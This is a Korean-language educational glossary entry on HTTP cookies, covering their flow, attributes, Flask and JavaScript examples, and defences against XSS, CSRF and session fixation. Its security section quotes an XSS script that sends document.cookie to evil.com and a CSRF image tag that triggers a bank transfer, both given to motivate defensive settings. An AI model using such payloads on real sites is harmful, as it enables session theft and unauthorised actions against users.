# Cookie (쿠키)

## 📝 정의

Cookie(쿠키)는 **웹사이트가 사용자의 브라우저에 저장하는 작은 데이터 파일**로, 사용자를 식별하고 상태를 유지하는 데 사용됩니다.

### 핵심 개념

- **무엇인가?**: 브라우저에 저장되는 키-값 데이터
- **왜 필요한가?**: HTTP는 상태가 없어서 로그인 유지 불가
- **어떻게 작동하나?**: 서버가 Set-Cookie → 브라우저 저장 → 매 요청마다 자동 전송

### Cookie가 해결하는 문제

**문제 상황**:
```
😱 시나리오: Cookie 없이 웹사이트 사용
사용자 → 로그인 성공
사용자 → 다음 페이지 클릭
서버 → "누구세요?" (로그인 정보 없음)
→ 매 페이지마다 재로그인! 😱
```

**Cookie의 해결**:
```
✅ 상태 유지:
로그인 성공 → 서버가 Cookie 발급
브라우저 → Cookie 저장
다음 페이지 → Cookie 자동 전송
서버 → "아, 로그인한 사용자군요!"
→ 로그인 유지! ✅
```

**비유**:
- **Cookie 없음** = 매번 신분증 제시
- **Cookie** = 출입증 (한 번 받으면 계속 사용)

## 📊 Cookie 동작 흐름

```도해
흐름: Cookie, 무슨 순서로 오가나
브라우저 :: 로그인 요청 (ID/PW)
서버 :: 인증 확인
서버 :: Set-Cookie: session_id=abc123
브라우저 :: 다음 페이지 요청 Cookie: session_id=abc1…
서버 :: Cookie로 사용자 확인
서버 :: 인증된 페이지 반환
```

## 💡 Cookie 생성 및 사용

### 서버에서 Cookie 설정
```python
from flask import Flask, make_response

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    """로그인 시 Cookie 설정"""
    # 인증 후
    if authenticate(username, password):
        response = make_response('Login successful')
        
        # Cookie 설정
        response.set_cookie(
            'session_id',
            value='abc123',
            max_age=3600,        # 1시간 유효
            httponly=True,       # JavaScript 접근 차단 (XSS 방지)
            secure=True,         # HTTPS만
            samesite='Lax'       # CSRF 방지
        )
        
        return response
    
    return 'Login failed', 401

@app.route('/dashboard')
def dashboard():
    """Cookie로 사용자 확인"""
    session_id = request.cookies.get('session_id')
    
    if not session_id:
        return redirect('/login')
    
    # Session ID로 사용자 조회
    user = get_user_by_session(session_id)
    return f'Welcome {user.name}!'

@app.route('/logout')
def logout():
    """Cookie 삭제"""
    response = make_response(redirect('/'))
    response.set_cookie('session_id', '', expires=0)
    return response
```

### JavaScript에서 Cookie 사용
```javascript
// Cookie 설정
document.cookie = "username=john; max-age=3600; path=/";

// Cookie 읽기
function getCookie(name) {
  const cookies = document.cookie.split(';');
  
  for (let cookie of cookies) {
    const [key, value] = cookie.trim().split('=');
    if (key === name) {
      return value;
    }
  }
  
  return null;
}

const username = getCookie('username');
console.log(username);  // "john"

// Cookie 삭제
document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/";
```

## 💡 Cookie 속성

### 1. Expires / Max-Age
```python
# Expires: 특정 날짜에 만료
response.set_cookie(
    'token',
    value='abc',
    expires=datetime(2026, 12, 31)
)

# Max-Age: 초 단위 수명
response.set_cookie(
    'token',
    value='abc',
    max_age=3600  # 1시간 후 만료
)
```

### 2. Domain
```python
# 특정 도메인에서만 사용
response.set_cookie(
    'token',
    value='abc',
    domain='.example.com'  # *.example.com 모두
)

# 서브도메인 포함:
# - example.com ✅
# - www.example.com ✅
# - api.example.com ✅
```

### 3. Path
```python
# 특정 경로에서만 전송
response.set_cookie(
    'admin_token',
    value='xyz',
    path='/admin'  # /admin/* 에서만
)

# /admin/dashboard → Cookie 전송 ✅
# /user/profile → Cookie 전송 안 함 ❌
```

### 4. Secure (HTTPS Only)
```python
# HTTPS에서만 전송
response.set_cookie(
    'sensitive_data',
    value='secret',
    secure=True
)

# HTTP → Cookie 전송 안 함 (보안)
# HTTPS → Cookie 전송 ✅
```

### 5. HttpOnly (XSS 방지)
```python
# JavaScript 접근 차단
response.set_cookie(
    'session_id',
    value='abc123',
    httponly=True
)

# JavaScript에서 접근 불가
# document.cookie → session_id 안 보임
# XSS 공격 방어!
```

### 6. SameSite (CSRF 방지)
```python
# Strict: 같은 사이트에서만
response.set_cookie(
    'token',
    value='abc',
    samesite='Strict'
)

# Lax: GET 요청은 허용 (권장)
response.set_cookie(
    'token',
    value='abc',
    samesite='Lax'
)

# None: 모든 요청 (secure=True 필수)
response.set_cookie(
    'token',
    value='abc',
    samesite='None',
    secure=True
)
```

## 💡 Cookie 보안

### 1. XSS 공격 방어
```python
# ❌ 취약: JavaScript 접근 가능
response.set_cookie('token', 'abc123')

# 공격자가 주입한 스크립트:
# <script>
#   fetch('https://evil.com?cookie=' + document.cookie);
# </script>

# ✅ 안전: HttpOnly 설정
response.set_cookie(
    'token',
    'abc123',
    httponly=True  # JavaScript 접근 차단
)
```

### 2. CSRF 공격 방어
```python
# ❌ 취약: 다른 사이트에서도 Cookie 전송
response.set_cookie('session_id', 'abc123')

# 공격자 사이트:
# <img src="https://bank.com/transfer?to=attacker&amount=1000">
# → 사용자의 Cookie가 자동 전송됨!

# ✅ 안전: SameSite 설정
response.set_cookie(
    'session_id',
    'abc123',
    samesite='Lax'  # 다른 사이트에서 POST 차단
)
```

### 3. Session Fixation 방어
```python
@app.route('/login', methods=['POST'])
def login():
    """로그인 시 새 Session ID 발급"""
    # ❌ 취약: 기존 Session ID 재사용
    session_id = request.cookies.get('session_id')
    
    # ✅ 안전: 새 Session ID 발급
    new_session_id = generate_secure_token()
    
    response = make_response('Login successful')
    response.set_cookie('session_id', new_session_id, httponly=True)
    
    return response
```

## 🎯 Cookie vs Session vs Token

| 항목 | Cookie | Session | JWT Token |
|------|--------|---------|-----------|
| **저장 위치** | 클라이언트 | 서버 | 클라이언트 |
| **크기** | 4KB | 제한 없음 | 수 KB |
| **보안** | 낮음 | 높음 | 중간 |
| **확장성** | 높음 | 낮음 | 높음 |
| **자동 전송** | ✅ | ❌ | ❌ |

## 💡 실전 예시

### 쇼핑몰 장바구니
```python
import json

@app.route('/cart/add', methods=['POST'])
def add_to_cart():
    """장바구니에 상품 추가"""
    product_id = request.json['product_id']
    
    # 기존 장바구니 읽기
    cart = request.cookies.get('cart', '[]')
    cart_items = json.loads(cart)
    
    # 상품 추가
    cart_items.append(product_id)
    
    # Cookie 업데이트
    response = make_response({'success': True})
    response.set_cookie(
        'cart',
        json.dumps(cart_items),
        max_age=7*24*60*60  # 7일
    )
    
    return response

@app.route('/cart')
def view_cart():
    """장바구니 조회"""
    cart = request.cookies.get('cart', '[]')
    cart_items = json.loads(cart)
    
    products = [get_product(id) for id in cart_items]
    return render_template('cart.html', products=products)
```

### 언어 설정
```python
@app.route('/set-language/<lang>')
def set_language(lang):
    """언어 설정"""
    response = make_response(redirect('/'))
    response.set_cookie(
        'language',
        lang,
        max_age=365*24*60*60  # 1년
    )
    return response

@app.before_request
def set_locale():
    """요청마다 언어 설정"""
    lang = request.cookies.get('language', 'ko')
    g.locale = lang
```

## 💡 Third-Party Cookie (서드파티 쿠키)

```
First-Party Cookie:
example.com → example.com 쿠키 설정
→ 같은 도메인

Third-Party Cookie:
example.com → ads.com 쿠키 설정 (광고 추적)
→ 다른 도메인

# 최신 브라우저는 Third-Party Cookie 차단
```

### Cookie 동의 (GDPR)
```html
<!-- Cookie 동의 배너 -->
<div id="cookie-banner">
  이 사이트는 쿠키를 사용합니다.
  <button onclick="acceptCookies()">동의</button>
</div>

<script>
function acceptCookies() {
  document.cookie = "cookie_consent=accepted; max-age=31536000; path=/";
  document.getElementById('cookie-banner').style.display = 'none';
}

// 페이지 로드 시 확인
if (getCookie('cookie_consent') === 'accepted') {
  document.getElementById('cookie-banner').style.display = 'none';
}
</script>
```

## 🔗 관련 용어

- [[세션]]: Cookie로 구현
- [[JWT]]: Cookie의 대안
- [[CSRF]]: Cookie 기반 공격
- [[XSS]]: Cookie 탈취 공격

---
*카테고리: 보안*
*생성일: 2026-02-14*
